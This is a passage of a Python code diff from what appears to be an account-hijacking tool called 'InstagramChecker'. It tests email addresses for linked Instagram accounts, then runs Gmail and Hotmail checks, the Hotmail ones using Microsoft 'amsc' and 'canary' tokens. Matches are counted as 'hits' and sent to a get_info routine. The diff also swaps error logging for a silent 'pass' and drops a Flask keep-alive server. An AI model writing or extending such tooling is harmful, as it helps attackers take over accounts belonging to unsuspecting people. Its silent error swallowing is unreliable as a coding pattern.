+                        s22 = self.insta2(email2)
+                    else:
+                        s22 = False
+                    
+                    if s11 == True:
+                        self.good_insgram += 1
+                        qq = self.check_gmail(email1)
+                        if qq == True:
+                            self.hits += 1
+                            username_split, domen = email1.split('@')
+                            self.get_info(username_split, domen)
+                        else:
+                            self.bad_email += 1
+                    else:
+                        self.bad_instgram += 1
+                    
+                    if s22 == True:
+                        self.good_insgram += 1
+                        # Only check hotmail if tokens are available
+                        if self.amsc is not None and self.canary is not None:
+                            qq = self.check_hotmail(email2)
+                            if qq == True:
+                                self.hits += 1
+                                username_split, domen = email2.split('@')
+                                self.get_info(username_split, domen)
+                            else:
+                                self.bad_email += 1
+                        else:
+                            # Skip hotmail check if tokens unavailable
+                            self.bad_email += 1
+                    else:
+                        self.bad_instgram += 1
             except Exception as e:
-                print(f"[{thread_id}] ERROR: {str(e)[:100]}")
-                time_module.sleep(1)
+                pass
 
-if __name__ == '__main__':
-    checker = InstagramChecker()
-    
-    # Start Flask in background
-    port = int(os.environ.get('PORT', 10000))
-    flask_thread = Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False), daemon=True)
-    flask_thread.start()
-    
-    print(f"[+] Web server running on port {port}")
-    
-    # Keep alive
-    try:
-        while True:
-            time_module.sleep(60)
-    except KeyboardInterrupt:
-        print("\n[!] Stopping...")
-        sys.exit(0)
+qredes()
